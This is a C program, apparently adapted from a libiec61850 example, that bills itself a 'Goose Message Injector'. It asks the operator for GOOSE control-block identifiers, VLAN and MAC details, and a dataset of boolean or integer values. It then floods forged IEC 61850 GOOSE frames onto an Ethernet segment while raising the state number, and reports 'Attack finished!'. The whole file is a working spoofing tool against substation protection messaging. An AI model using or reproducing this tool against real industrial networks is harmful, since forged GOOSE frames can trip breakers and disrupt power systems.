/*
 * goose_publisher_example.c
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

void setUpPublisher(GoosePublisher* publisher, LinkedList* dataSetValues) {
    char interface[64];
    printf("Interface: ");
    scanf("%63s", &interface);

    uint16_t appId;
    printf("AppId: ");
    scanf("%hu", &appId);

    uint16_t vlanId;
    printf("VlanId: ");
    scanf("%hu", &vlanId);

    uint8_t macAddress[6];
    printf("Dst MAC Address (e.g. 01:0C:CD:01:00:00): ");
    scanf("%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macAddress[0], &macAddress[1], &macAddress[2], &macAddress[3], &macAddress[4], &macAddress[5]);

    CommParameters gooseCommParameters;
    gooseCommParameters.appId = appId;
    gooseCommParameters.vlanId = vlanId;
    gooseCommParameters.vlanPriority = 4;
    gooseCommParameters.dstAddress[0] = macAddress[0];
    gooseCommParameters.dstAddress[1] = macAddress[1];
    gooseCommParameters.dstAddress[2] = macAddress[2];
    gooseCommParameters.dstAddress[3] = macAddress[3];
    gooseCommParameters.dstAddress[4] = macAddress[4];
    gooseCommParameters.dstAddress[5] = macAddress[5];

    *publisher = GoosePublisher_create(&gooseCommParameters, interface);

    if (!*publisher)
    {
        printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
        return;
    }

    char publisherRef[128];
    printf("gocbRef: ");
    scanf("%127s", &publisherRef);

    char dataSetRef[128];
    printf("datSet: ");
    scanf("%127s", &dataSetRef);

    char goId[128];
    printf("goID: ");
    scanf("%127s", &goId);

    uint32_t stNum;
    printf("stNum: ");
    scanf("%u", &stNum);

    uint32_t confRev;
    printf("confRev: ");
    scanf("%u", &confRev);

    GoosePublisher_setGoCbRef(*publisher, publisherRef);
    GoosePublisher_setGoID(*publisher, goId);
    GoosePublisher_setConfRev(*publisher, 1);
    GoosePublisher_setDataSetRef(*publisher, dataSetRef);
    GoosePublisher_setTimeAllowedToLive(*publisher, 300);
    GoosePublisher_setConfRev(*publisher, confRev);
    GoosePublisher_setStNum(*publisher, stNum);

    /* Setup data set fields */
    printf("Create a new data set\n");
    *dataSetValues = LinkedList_create();
    int opt = 1;
    while (opt != 0)
    {
        printf("Options:\n");
        printf("1: Add Boolean value\n");
        printf("2: Add Integer value\n");
        printf("0: Finished\n");
        printf("Enter an option (0 to exit): ");
        scanf("%d", &opt);

        if (opt == 1)
        {
            int valueInt;
            printf("Enter a value [0,1]: ");
            scanf("%d", &valueInt);
            bool value = valueInt == 1 ? true : false;

            LinkedList_add(*dataSetValues, MmsValue_newBoolean(value));
        }
        else if (opt == 2)
        {
            int16_t value;
            printf("Enter an integer value: ");
            scanf("%hd", &value);
            LinkedList_add(*dataSetValues, MmsValue_newIntegerFromInt16(value));
        }
        else if (opt == 0)
            break;
        
    }
}

void run(GoosePublisher* publisher, LinkedList* dataSetValues, int n)
{
    printf("Injecting %d messages...\n", n);
    int i = 0;
    for (i = 0; i < n; i++) {

       for (int j = 0; j < 5; j++)
       {
            if (GoosePublisher_publish(*publisher, *dataSetValues) == -1)
            {
                printf("Error sending message!\n");
                return;
            }
       }
       GoosePublisher_increaseStNum(*publisher);
       Thread_sleep(1000);
    }
    printf("Attack finished!\n");
}

/* has to be executed as root! */
int
main(int argc, char **argv)
{
    printf("*****************************************\n");
    printf("*                                       *\n");
    printf("*         Goose Message Injector        *\n");
    printf("*                                       *\n");
    printf("*****************************************\n");

    GoosePublisher* publisher = alloca(sizeof(GoosePublisher));
    LinkedList* dataSetValues = alloca(sizeof(LinkedList));

    setUpPublisher(publisher, dataSetValues);

    if (*publisher == NULL)
        return -1;

    int n;
    printf("Number of messages to be sent: ");
    scanf("%d", &n);

    run(publisher, dataSetValues, n);

    GoosePublisher_destroy(*publisher);

    return 0;
}
